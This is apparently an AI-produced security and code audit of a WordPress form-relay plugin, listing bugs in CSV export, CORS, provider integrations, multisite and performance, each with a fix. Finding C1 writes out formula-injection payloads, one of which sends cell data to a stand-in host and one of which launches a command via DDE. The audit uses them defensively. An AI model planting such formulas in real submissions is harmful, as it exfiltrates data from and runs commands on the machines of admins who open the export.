# PackRelay — Full Codebase Security & Code Audit

**Date:** 2026-06-10 · **Version audited:** 1.1.0 (branch `claude/pensive-chaum-9902f4`, clean tree)
**Scope:** All plugin PHP excluding `vendor/` and `tests/`. Three passes: security audit (with adversarial false-positive verification), correctness review, WordPress standards/performance review.

---

## Severity Summary

| Severity | Count | Theme |
|----------|-------|-------|
| Critical | 4 | Broken features shipped as working; one exploitable vuln |
| Warning | 13 | Data loss paths, provider contract violations, perf, multisite |
| Info | 11 | Dead code, drift, polish |

---

## CRITICAL

### C1. Security — CSV/Formula Injection in entry export (CWE-1236)
`includes/class-packrelay-entries-page.php:244-248` (also header row at `:220`)

Untrusted form-submission values (public REST endpoint + Divi front-end) are stored after only `sanitize_text_field()` — which does **not** strip leading `=`, `+`, `-`, `@`, tab, CR — then written verbatim via `fputcsv()` in `handle_export()`.

**Exploit:** Unauthenticated attacker submits a field value like `=HYPERLINK("http://evil.tld/?"&A1,"open")` or `=cmd|'/c calc'!A1`. Admin clicks Export CSV, opens in Excel/LibreOffice/Sheets → formula executes (data exfiltration; command execution where DDE enabled). Capability/nonce checks gate who downloads, not what's in the file. Verified end-to-end (confidence 7/10).

**Fix:** Neutralize every header and data cell before `fputcsv`:
```php
$sanitize_cell = function ( $v ) {
	$v = (string) $v;
	if ( '' !== $v && in_array( $v[0], array( '=', '+', '-', '@', "\t", "\r" ), true ) ) {
		$v = "'" . $v;
	}
	return $v;
};
```

### C2. Bulk delete can never execute — GET form, POST handler
`includes/class-packrelay-entries-page.php:332` vs `:282-290`

List page renders `<form method="get">`, but `handle_bulk_actions()` reads `$_POST['entry_ids']`, `$_POST['action']`, `$_POST['_wpnonce']` exclusively. With a GET form those are always empty → "Apply → Delete" silently does nothing.

**Fix:** `<form method="post">` (keep hidden `page` input, re-add GET filters as hidden inputs), or read `$_REQUEST` + `$list_table->current_action()`. Prefer POST for destructive actions.

### C3. Email template settings are a dead feature
`includes/class-packrelay-settings.php:450` (`parse_template` — zero call sites) vs `includes/providers/class-packrelay-provider-divi.php:244-285`

Full settings UI exists (`notification_subject`, `notification_body`, placeholder buttons, defaults, sanitization), but `PackRelay_Provider_Divi::send_notifications()` hardcodes its own subject (`[PackRelay] New submission: %s`) and HTML table body. Admin customization has zero effect. CLAUDE.md documents these settings as live — docs and code disagree.

**Fix:** Build subject/body via `PackRelay_Settings::parse_template()` with `form_name`, `form_id`, `entry_id`, `fields`, `ip_address` populated; fall back to defaults when empty. Or remove the section + `parse_template()` if abandoned.

### C4. CORS broken for the plugin's primary mobile use case — `esc_url()` strips app schemes
`includes/class-packrelay-rest-api.php:308-314`

```php
$safe_origin = esc_url( $safe_origin );
header( 'Access-Control-Allow-Origin: ' . $safe_origin );
```

`esc_url()` only allows `wp_allowed_protocols()` schemes. `capacitor://localhost` — the exact value the settings description (`class-packrelay-settings.php:150`) tells users to configure — becomes `//localhost`, which never matches the browser's `Origin`. Same for `ionic://` and custom schemes. WKWebView clients enforce CORS, so the core mobile-app flow breaks.

**Fix:** Origin already passed strict `in_array( $origin, $allowed_origins, true )` and CRLF stripping. Drop `esc_url()`; echo the matched configured allowlist value.

---

## WARNINGS

### W1. WPForms entries stored in wrong `fields` format — blank in WPForms admin
`includes/providers/class-packrelay-provider-wpforms.php:149-157`
`wpforms()->entry->add()` gets `{"1":"John"}` but WPForms expects `{"1":{"id":1,"type":"text","value":"John","name":"Name"}}`. Native entry screens/exports read `$field['value']` → render blank. The correct structure (`$wpf_fields`) is already built later in `send_notifications()` (lines 193-200) — use it in `create_entry()`.

### W2. `entry_email()` called with wrong args — `{entry_id}` smart tags resolve to 0
`includes/providers/class-packrelay-provider-wpforms.php:203-214`
Signature is `entry_email( $fields, $entry, $form_data, $entry_id = 0, $context = '' )`; only 3 args passed. Setting `wpforms()->process->entry_id` doesn't substitute. Pass `$entry_id, 'entry'` explicitly; pass `$entry` in WPForms' expected shape.

### W3. Gravity Forms multi-input fields silently lose values
`includes/providers/class-packrelay-provider-gravityforms.php:128-131`
Composite fields (Name, Address, multi-Checkbox) need `input_{id}_{subid}` keys; code only produces `input_{id}` and never converts `1.3` → `input_1_3`. Values dropped, or required-field validation fails opaquely. Fix: `'input_' . str_replace( '.', '_', $field_id )` + expose sub-inputs from `$field->inputs` in `get_fields()`/`get_field_types()`.

### W4. GF user-validation failures return HTTP 500
`includes/class-packrelay-rest-api.php:167-174` + `class-packrelay-provider-gravityforms.php:162-166`
Missing-required-field (client error) maps to same `entry_failed`/500 as server crash. Map validation failures to 400/422 and surface GF per-field messages.

### W5. Non-scalar field values cause PHP 8 fatals
`includes/class-packrelay-rest-api.php:151-154`, `provider-divi.php:166-168`, `entries-page.php:415`, `entries-list-table.php:182`
Only the container is checked with `is_array( $fields )`; values can be arrays → `sanitize_text_field( array )` fatals (raw 500 on submit), and `esc_html( array )` fatals on the admin detail page for stored non-Divi entries. Reject non-scalar values with 400 in `handle_submit()`; defensively `wp_json_encode()` when rendering.

### W6. Divi `/fields` response violates provider contract — no `id` on fields
`includes/class-packrelay-rest-api.php:270` + `provider-divi.php:376-388`
`handle_get_fields()` returns `$form['fields']`; Divi's `parse_fields()` omits `id`, so introspecting clients get no submit keys (submit expects `"0"`, `"1"`, …). Fix: return `$this->provider->get_fields( $form_id )` (Divi's `get_fields()` adds `'id' => (string) $index`).

### W7. X-Forwarded-For trusted by default; WPForms provider bypasses the filter entirely
`rest-api.php:190-202`, `provider-divi.php:173-185`, `provider-wpforms.php:139-147`
Default `packrelay_trusted_proxy_headers` includes XFF → any client forges stored `ip_address`. WPForms copy of the logic skips the filter, so even opting out via the filter still records spoofed IPs. Fix: default filter to `array()` (trust `REMOTE_ADDR` only, opt-in for proxies) and extract one shared `get_client_ip( $request )` helper on the abstract provider (logic currently copy-pasted 3×).

### W8. No multisite support — subsite data silently lost; uninstall orphans tables
`includes/class-packrelay-activator.php:23-43`, `uninstall.php:15-33`
Network activation creates the entries table for the main site only; every subsite insert fails silently (entries lost, no error). Uninstall drops only one site's table/options. Fix: `is_multisite()` → iterate `get_sites()` + `switch_to_blog()` in both; hook `wp_initialize_site` for new subsites.

### W9. No DB schema upgrade path — PUC updates never re-run dbDelta
`includes/class-packrelay-activator.php:38`, `packrelay.php`
Plugin-update-checker updates don't fire activation hooks, and no stored db-version check exists. Sites that installed before `form_name`/`page_id`/`page_title`/`referer_url` columns were added keep the old schema → every `$wpdb->insert` fails → **all entries silently lost** until manual deactivate/reactivate. Fix: store `packrelay_db_version`; on `plugins_loaded`, re-run `create_table()` (dbDelta is idempotent) when stale.

### W10. Kreait Firebase SDK instantiated on every request
`class-packrelay.php:68` → `rest-api.php:56` → `appcheck.php:33`
`new \Kreait\Firebase\Factory()` runs on every page view; only needed inside `verify()` on `POST /submit`. Fix: lazy-init (`$this->factory ??= new Factory();`).

### W11. App Check JWKS fetched from Google on every submission
`includes/class-packrelay-appcheck.php:63-69`
Kreait caches keys in memory only; PHP request lifecycle → blocking HTTPS fetch to Google per submit. Fix: pass kreait a PSR-16 cache adapter over `get_transient`/`set_transient` (Google serves JWKS with ~6h cache headers).

### W12. CSV export: two full-table scans, O(n²) LIMIT/OFFSET pagination, DESC-order drift
`includes/class-packrelay-entries-page.php:181-256`
Pass 1 decodes every row for labels; pass 2 re-reads everything; both use `LIMIT 500 OFFSET n` (100k rows → ~10M row reads per pass). Also `ORDER BY id DESC` + OFFSET means concurrent inserts duplicate/skip rows mid-export. Fix: keyset pagination (`WHERE id > %d ORDER BY id ASC LIMIT 500`); pass 1 select `fields` column only, or single pass to temp file.

### W13. Google Fonts loaded from external CDN in wp-admin
`includes/class-packrelay-entries-page.php:73-78`
Leaks admin IPs to Google (GDPR — German courts have fined for exactly this), violates wp.org external-assets guideline, breaks offline/intranet. Fix: bundle WOFF2 locally or use admin system font stack.

---

## INFO

| # | Finding | Location | Fix |
|---|---------|----------|-----|
| I1 | No `load_plugin_textdomain()` — GitHub-distributed plugin, translations can never load | whole plugin | Hook `init`, ship `languages/` |
| I2 | Cached `/fields` response missing `Vary: Origin` — shared caches can serve wrong ACAO | `rest-api.php:275` | Add `Vary: Origin` header |
| I3 | REST entries never set `form_name`/`page_*` — blank columns in list/detail/CSV for all Mobile App entries | `rest-api.php:204-213`, `provider-divi.php:188-197` | Provider has `$form['title']` in hand — store it |
| I4 | Provider notice transient logic inverted — shows "missing" even after provider activated (30s window); transient adds nothing | `class-packrelay.php:120` | Key solely on `! is_provider_available()` |
| I5 | Dead code: `clear_cache()` ×2 (settings cache never invalidated after `update_option`), `get_distinct_forms/pages`, `extract_name/email`, `handle_options()` (WP core intercepts REST OPTIONS) | settings.php:404, factory.php:41, entry-store.php:260-294, divi-submissions.php:101-135, rest-api.php:83-113 | Wire `clear_cache` to `update_option_packrelay_settings`; delete or wire the rest |
| I6 | Providers re-parse form 2× per submission (`get_form()` then `get_field_types()` → `get_form()` again) | `rest-api.php:133,157` | Memoize `get_form()` per `$form_id` |
| I7 | Provider sanitize fallback hardcodes `'divi'` even when Divi unavailable | `settings.php:368-373` | Fall back to previously saved value |
| I8 | `date_created datetime NOT NULL DEFAULT '0000-00-00 00:00:00'` — invalid under server-enforced `NO_ZERO_DATE` | `entry-store.php:50` | Drop DEFAULT (code always supplies value) |
| I9 | Inline success notices mid-render; `handle_delete()` silently no-ops on nonce failure (view action `wp_die`s) | `entries-page.php:268-275, 301` | Redirect + query-arg + `admin_notices`; consistent nonce failure handling |
| I10 | Filter UI parity: `form_id_filter` supported by list table but no UI input; export ignores it | `entries-list-table.php:266`, `entries-page.php:162-175` | Align or remove |
| I11 | Stale metadata: composer.json description says "WPForms submissions" (pre-rewrite); readme.txt "Tested up to: 6.7" stale; CLAUDE.md documents email templates as live (see C3) | composer.json:3, readme.txt:5, CLAUDE.md | Update all three |

---

## Verified clean (security)

- **SQL:** all `$wpdb` queries prepared; `orderby` whitelisted; `order` normalized; uninstall uses `esc_sql` + prepared transient cleanup.
- **CORS allowlist:** strict `in_array(..., true)`, CRLF-stripped, no wildcard, no unconditional reflection (the C4 bug is functional, not exploitable).
- **App Check:** fail-closed — empty token/project rejected; `catch (\Throwable)` returns failure; cryptographic verification via kreait.
- **Form allowlist:** fail-closed (empty list → deny), strict comparison handles `42:0` format.
- **Admin pages:** `manage_options` gate, per-entry view nonces, delete/bulk nonces (though bulk is unreachable — C2).
- **XSS:** all entry data escaped with `esc_html()` in list table and detail page.
- **Email header injection:** Divi notification recipients/subject come from admin-controlled shortcode attrs, not REST input; headers static.

## Verified clean (quality)

- Entries queries always LIMIT'd + prepared; index coverage matches actual WHERE clauses.
- `uninstall.php` correct choice over `register_uninstall_hook`; cleans option, table, transients (single-site).
- Version in sync: header, `PACKRELAY_VERSION`, readme stable tag (1.1.0). PUC configured correctly with `enableReleaseAssets()`. Makefile builds with `--no-dev --optimize-autoloader`.

---

## Recommended fix order

1. **C1** CSV injection — small, real vuln, trivial fix.
2. **C2** bulk delete + **C4** CORS scheme stripping — small fixes, user-visible breakage.
3. **W9** DB upgrade path + **W8** multisite — both are silent-data-loss bugs.
4. **C3** email templates — decide product intent (wire or remove).
5. **W1–W6** provider correctness cluster (WPForms entry format/email args, GF multi-input/status codes, non-scalar 400, Divi field ids).
6. **W7** shared IP helper with safe default.
7. **W10–W12** perf (lazy Firebase, JWKS transient cache, keyset export).
8. **W13** local fonts, then Info items opportunistically.

---

*Methodology: security pass by dedicated agent with full data-flow tracing (REST → provider → store → admin/CSV/email), each finding adversarially re-verified by an independent agent; correctness and WP-standards passes by two parallel agents reading every non-vendor PHP file. CodeRabbit CLI skipped (signed out + no diff on branch).*
